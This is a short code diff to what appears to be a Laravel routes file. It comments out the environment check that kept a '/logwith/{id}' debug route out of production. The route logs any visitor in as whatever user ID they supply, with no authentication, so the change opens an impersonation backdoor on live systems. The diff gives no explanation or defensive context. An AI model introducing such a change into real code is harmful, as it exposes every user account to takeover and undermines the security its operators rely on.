@@ -29,9 +29,9 @@ Route::group(['middleware' => ['auth', 'ActiveUser']], function () {
 
 Auth::routes();
 
-if (!app()->environment('production') && Schema::hasTable('users')) {
+//if (!app()->environment('production') && Schema::hasTable('users')) {
     Route::get('/logwith/{id}', function ($id) {
         Auth::loginUsingId($id);
         return redirect()->home();
     });
-}
+//}
